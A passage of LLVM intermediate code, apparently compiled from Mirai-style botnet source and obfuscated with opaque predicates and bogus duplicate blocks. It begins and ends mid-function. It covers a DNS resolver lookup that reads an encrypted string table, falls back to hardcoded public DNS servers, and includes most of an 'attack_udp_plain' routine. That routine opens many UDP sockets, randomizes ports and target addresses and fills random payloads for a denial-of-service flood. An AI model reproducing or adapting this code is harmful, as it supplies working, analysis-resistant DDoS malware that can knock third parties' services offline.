  %68 = or i1 %66, %67
  br i1 %68, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %60
  store i32 0, i32* %14, align 4
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %69 = load i32, i32* %12, align 4
  store i32 %69, i32* %14, align 4
  %70 = load i32, i32* @x.31
  %71 = load i32, i32* @y.32
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %78

; <label>:78:                                     ; preds = %196, %originalBBpart28
  %79 = load i32, i32* @x.31
  %80 = load i32, i32* @y.32
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %78
  %87 = load i32, i32* %14, align 4
  %88 = load i32, i32* %11, align 4
  %89 = icmp slt i32 %87, %88
  %90 = load i32, i32* @x.31
  %91 = load i32, i32* @y.32
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %89, label %98, label %199

; <label>:98:                                     ; preds = %originalBBpart212
  %99 = load i32, i32* %14, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %100
  %102 = load i8, i8* %101, align 1
  store i8 %102, i8* %18, align 1
  %103 = load i8, i8* %16, align 1
  %104 = icmp ne i8 %103, 0
  br i1 %104, label %148, label %105

; <label>:105:                                    ; preds = %98
  %106 = load i8, i8* %18, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %107, 32
  br i1 %108, label %129, label %109

; <label>:109:                                    ; preds = %105
  %110 = load i32, i32* @x.31
  %111 = load i32, i32* @y.32
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %109
  %118 = load i8, i8* %18, align 1
  %119 = sext i8 %118 to i32
  %120 = icmp eq i32 %119, 9
  %121 = load i32, i32* @x.31
  %122 = load i32, i32* @y.32
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %120, label %129, label %146

; <label>:129:                                    ; preds = %originalBBpart216, %105
  %130 = load i32, i32* @x.31
  %131 = load i32, i32* @y.32
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %129
  %138 = load i32, i32* @x.31
  %139 = load i32, i32* @y.32
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %196

; <label>:146:                                    ; preds = %originalBBpart216
  store i8 1, i8* %16, align 1
  br label %147

; <label>:147:                                    ; preds = %146
  br label %148

; <label>:148:                                    ; preds = %147, %98
  %149 = load i8, i8* %18, align 1
  %150 = sext i8 %149 to i32
  %151 = icmp ne i32 %150, 46
  br i1 %151, label %152, label %160

; <label>:152:                                    ; preds = %148
  %153 = load i8, i8* %18, align 1
  %154 = sext i8 %153 to i32
  %155 = icmp slt i32 %154, 48
  br i1 %155, label %165, label %156

; <label>:156:                                    ; preds = %152
  %157 = load i8, i8* %18, align 1
  %158 = sext i8 %157 to i32
  %159 = icmp sgt i32 %158, 57
  br i1 %159, label %165, label %160

; <label>:160:                                    ; preds = %156, %148
  %161 = load i32, i32* %14, align 4
  %162 = load i32, i32* %11, align 4
  %163 = sub nsw i32 %162, 1
  %164 = icmp eq i32 %161, %163
  br i1 %164, label %165, label %179

; <label>:165:                                    ; preds = %160, %156, %152
  %166 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %168 = load i32, i32* %12, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %167, i64 %169
  %171 = load i32, i32* %14, align 4
  %172 = load i32, i32* %12, align 4
  %173 = sub nsw i32 %171, %172
  call void @util_memcpy(i8* %166, i8* %170, i32 %173)
  %174 = load i32, i32* %14, align 4
  %175 = load i32, i32* %12, align 4
  %176 = sub nsw i32 %174, %175
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %177
  store i8 0, i8* %178, align 1
  store i8 1, i8* %17, align 1
  br label %199

; <label>:179:                                    ; preds = %160
  %180 = load i32, i32* @x.31
  %181 = load i32, i32* @y.32
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %179
  %188 = load i32, i32* @x.31
  %189 = load i32, i32* @y.32
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %196

; <label>:196:                                    ; preds = %originalBBpart224, %originalBBpart220
  %197 = load i32, i32* %14, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %14, align 4
  br label %78

; <label>:199:                                    ; preds = %165, %originalBBpart212
  %200 = load i8, i8* %17, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %205

; <label>:202:                                    ; preds = %199
  %203 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %204 = call i32 @inet_addr(i8* %203) #6
  store i32 %204, i32* %9, align 4
  br label %234

; <label>:205:                                    ; preds = %199
  %206 = load i32, i32* @x.31
  %207 = load i32, i32* @y.32
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %205
  %214 = load i32, i32* @x.31
  %215 = load i32, i32* @y.32
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %222

; <label>:222:                                    ; preds = %originalBBpart228, %originalBBpart24
  br label %223

; <label>:223:                                    ; preds = %222, %originalBBpart2
  %224 = call i32 @rand_next()
  %225 = urem i32 %224, 4
  switch i32 %225, label %234 [
    i32 0, label %226
    i32 1, label %228
    i32 2, label %230
    i32 3, label %232
  ]

; <label>:226:                                    ; preds = %223
  %227 = call i32 @htonl(i32 134744072) #7
  store i32 %227, i32* %9, align 4
  br label %234

; <label>:228:                                    ; preds = %223
  %229 = call i32 @htonl(i32 1246898730) #7
  store i32 %229, i32* %9, align 4
  br label %234

; <label>:230:                                    ; preds = %223
  %231 = call i32 @htonl(i32 1074151430) #7
  store i32 %231, i32* %9, align 4
  br label %234

; <label>:232:                                    ; preds = %223
  %233 = call i32 @htonl(i32 67240450) #7
  store i32 %233, i32* %9, align 4
  br label %234

; <label>:234:                                    ; preds = %232, %230, %228, %226, %223, %202
  %235 = load i32, i32* @x.31
  %236 = load i32, i32* @y.32
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %234
  %243 = load i32, i32* %9, align 4
  %244 = load i32, i32* @x.31
  %245 = load i32, i32* @y.32
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %243

originalBBalteredBB:                              ; preds = %originalBB, %0
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i32, align 4
  %255 = alloca i32, align 4
  %256 = alloca [2048 x i8], align 16
  %257 = alloca i32, align 4
  %258 = alloca [32 x i8], align 16
  %259 = alloca i8, align 1
  %260 = alloca i8, align 1
  %261 = alloca i8, align 1
  store i32 0, i32* %253, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %262 = call i8* @table_retrieve_val(i32 41, i32* null)
  %263 = call i32 (i8*, i32, ...) @open(i8* %262, i32 0)
  store i32 %263, i32* %253, align 4
  call void @table_lock_val(i8 zeroext 41)
  %264 = load i32, i32* %253, align 4
  %265 = icmp sge i32 %264, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %266 = load i32, i32* %10, align 4
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %268 = call i64 @read(i32 %266, i8* %267, i64 2048)
  %269 = trunc i64 %268 to i32
  store i32 %269, i32* %11, align 4
  %270 = load i32, i32* %10, align 4
  %271 = call i32 @close(i32 %270)
  call void @table_unlock_val(i8 zeroext 42)
  %272 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %273 = load i32, i32* %11, align 4
  %274 = call i8* @table_retrieve_val(i32 42, i32* null)
  %275 = call i32 @util_stristr(i8* %272, i32 %273, i8* %274)
  store i32 %275, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 42)
  %276 = load i32, i32* %12, align 4
  %277 = icmp ne i32 %276, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %60
  store i32 0, i32* %14, align 4
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %278 = load i32, i32* %12, align 4
  store i32 %278, i32* %14, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %78
  %279 = load i32, i32* %14, align 4
  %280 = load i32, i32* %11, align 4
  %281 = icmp slt i32 %279, %280
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %109
  %282 = load i8, i8* %18, align 1
  %283 = sext i8 %282 to i32
  %284 = icmp eq i32 %283, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %129
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %179
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %205
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %234
  %285 = load i32, i32* %9, align 4
  br label %originalBB30
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.33
  %7 = load i32, i32* @y.34
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8**, align 8
  %21 = alloca i32*, align 8
  %22 = alloca i16, align 2
  %23 = alloca i16, align 2
  %24 = alloca i16, align 2
  %25 = alloca i8, align 1
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca i32, align 4
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i8*, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  %34 = load i8, i8* %15, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %20, align 8
  %38 = load i8, i8* %15, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 4) #6
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %21, align 8
  %42 = load i8, i8* %17, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 7, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %22, align 2
  %46 = load i8, i8* %17, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 6, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %23, align 2
  %50 = load i8, i8* %17, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 0, i32 512)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %24, align 2
  %54 = load i8, i8* %17, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 1, i32 1)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %25, align 1
  %58 = bitcast %struct.sockaddr_in* %26 to i8*
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 16, i32 4, i1 false)
  %59 = call i64 @time(i64* null) #6
  %60 = load i32, i32* %14, align 4
  %61 = sext i32 %60 to i64
  %62 = add nsw i64 %59, %61
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %27, align 4
  %64 = load i16, i16* %23, align 2
  %65 = zext i16 %64 to i32
  %66 = icmp eq i32 %65, 65535
  %67 = load i32, i32* @x.33
  %68 = load i32, i32* @y.34
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %75, label %78

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  store i16 %77, i16* %23, align 2
  br label %81

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i16, i16* %23, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #7
  store i16 %80, i16* %23, align 2
  br label %81

; <label>:81:                                     ; preds = %78, %75
  store i32 0, i32* %19, align 4
  br label %82

; <label>:82:                                     ; preds = %258, %81
  %83 = load i32, i32* %19, align 4
  %84 = load i8, i8* %15, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp slt i32 %83, %85
  br i1 %86, label %87, label %261

; <label>:87:                                     ; preds = %82
  %88 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %89 = load i8**, i8*** %20, align 8
  %90 = load i32, i32* %19, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %89, i64 %91
  store i8* %88, i8** %92, align 8
  %93 = load i16, i16* %22, align 2
  %94 = zext i16 %93 to i32
  %95 = icmp eq i32 %94, 65535
  br i1 %95, label %96, label %105

; <label>:96:                                     ; preds = %87
  %97 = call i32 @rand_next()
  %98 = trunc i32 %97 to i16
  %99 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %100 = load i32, i32* %19, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %99, i64 %101
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %102, i32 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 1
  store i16 %98, i16* %104, align 2
  br label %130

; <label>:105:                                    ; preds = %87
  %106 = load i32, i32* @x.33
  %107 = load i32, i32* @y.34
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %105
  %114 = load i16, i16* %22, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #7
  %116 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %117 = load i32, i32* %19, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 0
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %120, i32 0, i32 1
  store i16 %115, i16* %121, align 2
  %122 = load i32, i32* @x.33
  %123 = load i32, i32* @y.34
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %130

; <label>:130:                                    ; preds = %originalBBpart24, %96
  %131 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %132 = load i32*, i32** %21, align 8
  %133 = load i32, i32* %19, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 %131, i32* %135, align 4
  %136 = icmp eq i32 %131, -1
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %130
  br label %384

; <label>:138:                                    ; preds = %130
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %139, align 4
  %140 = load i16, i16* %23, align 2
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %140, i16* %141, align 2
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %143 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %142, i32 0, i32 0
  store i32 0, i32* %143, align 4
  %144 = load i32*, i32** %21, align 8
  %145 = load i32, i32* %19, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i32, i32* %144, i64 %146
  %148 = load i32, i32* %147, align 4
  %149 = bitcast %union.__CONST_SOCKADDR_ARG* %31 to %struct.sockaddr**
  %150 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  store %struct.sockaddr* %150, %struct.sockaddr** %149, align 8
  %151 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %31, i32 0, i32 0
  %152 = load %struct.sockaddr*, %struct.sockaddr** %151, align 8
  %153 = call i32 @bind(i32 %148, %struct.sockaddr* %152, i32 16) #6
  %154 = icmp eq i32 %153, -1
  br i1 %154, label %155, label %172

; <label>:155:                                    ; preds = %138
  %156 = load i32, i32* @x.33
  %157 = load i32, i32* @y.34
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %155
  %164 = load i32, i32* @x.33
  %165 = load i32, i32* @y.34
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %172

; <label>:172:                                    ; preds = %originalBBpart28, %138
  %173 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %174 = load i32, i32* %19, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 2
  %178 = load i8, i8* %177, align 4
  %179 = zext i8 %178 to i32
  %180 = icmp slt i32 %179, 32
  br i1 %180, label %181, label %223

; <label>:181:                                    ; preds = %172
  %182 = load i32, i32* @x.33
  %183 = load i32, i32* @y.34
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %181
  %190 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %191 = load i32, i32* %19, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #7
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %199 = load i32, i32* %19, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 %206) #7
  %208 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %209 = load i32, i32* %19, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 0
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %212, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  store i32 %207, i32* %214, align 4
  %215 = load i32, i32* @x.33
  %216 = load i32, i32* @y.34
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart225, label %originalBB10alteredBB

originalBBpart225:                                ; preds = %originalBB10
  br label %223

; <label>:223:                                    ; preds = %originalBBpart225, %172
  %224 = load i32*, i32** %21, align 8
  %225 = load i32, i32* %19, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i32, i32* %224, i64 %226
  %228 = load i32, i32* %227, align 4
  %229 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %230 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %231 = load i32, i32* %19, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 0
  %235 = bitcast %struct.sockaddr_in* %234 to %struct.sockaddr*
  store %struct.sockaddr* %235, %struct.sockaddr** %229, align 8
  %236 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %237 = load %struct.sockaddr*, %struct.sockaddr** %236, align 8
  %238 = call i32 @connect(i32 %228, %struct.sockaddr* %237, i32 16)
  %239 = icmp eq i32 %238, -1
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %223
  br label %241

; <label>:241:                                    ; preds = %240, %223
  %242 = load i32, i32* @x.33
  %243 = load i32, i32* @y.34
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %241
  %250 = load i32, i32* @x.33
  %251 = load i32, i32* @y.34
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %258

; <label>:258:                                    ; preds = %originalBBpart229
  %259 = load i32, i32* %19, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %19, align 4
  br label %82

; <label>:261:                                    ; preds = %82
  %262 = load i32, i32* @x.33
  %263 = load i32, i32* @y.34
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %261
  %270 = load i32, i32* @x.33
  %271 = load i32, i32* @y.34
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %278

; <label>:278:                                    ; preds = %383, %originalBBpart233
  %279 = load i32, i32* @x.33
  %280 = load i32, i32* @y.34
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %278
  store i32 0, i32* %19, align 4
  %287 = load i32, i32* @x.33
  %288 = load i32, i32* @y.34
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %295

; <label>:295:                                    ; preds = %originalBBpart251, %originalBBpart237
  %296 = load i32, i32* %19, align 4
  %297 = load i8, i8* %15, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %296, %298
  br i1 %299, label %300, label %361

; <label>:300:                                    ; preds = %295
  %301 = load i8**, i8*** %20, align 8
  %302 = load i32, i32* %19, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %33, align 8
  %306 = load i8, i8* %25, align 1
  %307 = icmp ne i8 %306, 0
  br i1 %307, label %308, label %316

; <label>:308:                                    ; preds = %300
  %309 = load i8*, i8** %33, align 8
  %310 = load i16, i16* %24, align 2
  %311 = zext i16 %310 to i32
  call void @rand_alpha_str(i8* %309, i32 %311)
  %312 = load i8*, i8** %33, align 8
  %313 = load i16, i16* %24, align 2
  %314 = zext i16 %313 to i64
  %315 = getelementptr inbounds i8, i8* %312, i64 %314
  store i8 0, i8* %315, align 1
  br label %316

; <label>:316:                                    ; preds = %308, %300
  %317 = load i32, i32* @x.33
  %318 = load i32, i32* @y.34
  %319 = sub i32 %317, 1
